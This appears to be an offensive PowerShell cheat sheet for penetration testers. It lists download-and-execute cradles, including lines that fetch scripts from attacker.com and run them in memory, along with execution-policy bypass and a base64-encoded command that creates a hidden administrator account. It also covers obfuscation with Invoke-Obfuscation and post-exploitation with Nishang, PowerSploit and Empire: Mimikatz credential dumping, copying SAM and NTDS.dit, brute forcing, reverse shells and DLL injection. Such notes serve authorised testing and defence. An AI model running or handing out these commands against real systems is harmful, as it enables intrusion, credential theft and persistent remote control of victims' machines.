## Prerequisite
* `-ExecutionPolicy bypass -Window hidden`
## Download and Execution
#### In-Memory
* `iex (New-Object Net.WebCLient).DownloadString('<remote_file>')` - downloads and executes the remote file
* `iex (New-Object Net.WebClient).DownloadData()`
* `iex (New-Object Net.WebClient).OpenRead()`
* `iex (New-Object Net.HttpWebRequest) - Certutil.exe -ping`
* __Net.WebRequest__
  * `$req=[System.Net.WebRequest]::Create("<http://attacker.com/game.ps1>")`
  * `$res=$req.GetResponse()`
  * `iex ([SYstem.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()`
* __System.Xml.XmlDocument__
  * `$xmldoc = New-Object System.Xml.XmlDocument`
  * `$xmldoc.Load("<remote_xml_file>")`
  * `iex $xmldoc.command.a.execute` - download and executes malicious PowerShell located inside XML document
* __Msxml2.XMLHTTP__
  * `$downloader = New-Object  -ComObject Msxml2.XMLHTTP`
  * `$downloader.open("GET","http://attacker.com/game.ps1",$false)`
  * `$downloader.send()`
  * `iex $downloader.responseText`
* __WinHttp.WinHttpRequest.5.1__
  * same as __Msxml2.XMLHTTP__

#### On-Disk
* __DownloadFile__
  * `$local_file="<C:\programdata\payload.exe>"` 
  * `New-Object Net.WebClient).DownloadFile($payload,$local_file)`
  * `& $local_file`
* `BTSAdmin.exe`
* `iex (New-Object Net.HttpWebRequest) - Certutil.exe -urlcache`
* `Invoke-WebRequest -Uri <target> -OutFile <filename>` - download file from target

#### Tools
* https://github.com/danielbohannon/Invoke-CradleCrafter

## Obfuscation
#### Native PS
* __EncodedCommand__
  * `$command = \`net user admin1 "password!" /add; net localgroup administrators admin1 /add\``
  * `$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)`
  * `$encodedCommand = [Convert]::ToBase64String($bytes)`
  * `Write-Host $encodedCommand`
  * `cmd> powershell.exe -encodedcommand <result-from-Write-Host>`

#### Tools
* https://github.com/danielbohannon/Invoke-Obfuscation
  * `$env:PSModulePath` - get modules path; copy downlaoded modules to this location
  * `Import_module Invoke-Obfuscation`
  * `Invoke-Obfuscation`
    * `Set SCRIPTBLOCK iex (New-Object Net.WebCLient).DownloadString('<remote_file>')`
    * if applying multiple methods one after another, they pile up (and potentially go above cmd.exe character count limtiation). Use `RESET` to clear previous encodings"
   
 ## Information Gathering and Recon
 #### Tools
* __PowerSploit__
  * `Invoke-Portscan` - port scan and network mapping
  * `Get-HttpStatus` - enumerate files and directories
* __Posh-SecMod__ - https://github.com/darkoperator/Posh-SecMod
  * `Invoke-ARPScan` - arp scan
  * `Invoke-ReverseDNSLookup`
  * `Resolve-HostRecord`
  * `Resolve-DNSRecord`
  * `Get-Command -Module Posh-SecMod` - see full features ofthe tool
 
## PostExploitation
#### Tools
* __Nishang__ - run in-memory with `iex (New-Object Net.WebClient).DownloadString("")` - https://github.com/samratashok/nishang
  *  __Gather__ - https://github.com/samratashok/nishang#gather
     * `Copy-VSS` - copy SAM database, NTDS.dit and contents of SYSTEM reg hive
     * `Get-Information`
     * `Get-PassHints` - dump Password Hints used on the system
     * `Invoke-Mimikatz -DumpCreds` - cump clear-text credentials
  *  __Bruteforcing__ - https://github.com/samratashok/nishang/tree/master/Scan
     * `Invoke-BruteForce` -> various bruteforcing options. See `Get-Help Invoke-BruteForce`
  *  __Shells__ - https://github.com/samratashok/nishang/tree/master/Shells
     * `Invoke-PowerShellTcp` - reverse PowerShell shell
* __PowerSploit__ - run in-memory with `iex (New-Object Net.WebClient).DownloadString("")` - https://github.com/PowerShellMafia/PowerSploit
  * __PrivEsc__ - `Import-Module .\Privesc.psm1`
     * `Invoke-AllChecks`
  * __Code Execution__ - `Import-Module CodeExecution`
     * `Invoke-DLLInjection`
        - find a processes to inject DLL: `ps | ? {$_.ProcessesName -match "notepad"}`
        - Use PID from above in `Invoke-DLLInjection -ProcessID <PID> <DLL-location>`
* __PSGetSystem__ - https://github.com/decoder-it/psgetsystem
  * `Get-Process -IncludeUserName | Where-Object {$_.UserName -match "SYSTEM"} | Format-List -Property Username,Name,Id` - identify SYSTEM processes 
* __Empire__ (implements Powershell without requiring powersell on the target machine)- https://github.com/EmpireProject/Empire
1. `uselistener` - Configure listener
   * `set CertPath <location>` -> result of running `Empire/setup/cert.sh`
3. `usestager` - Configure stager
   * `set listener <>`
4. `agents`
   * `interact <agent>`
       * `shell whoami`
       * `searchmodule <keyword>`
       * `usemodule privesc/powerup/allchecks` -> `execute`
       * `help`
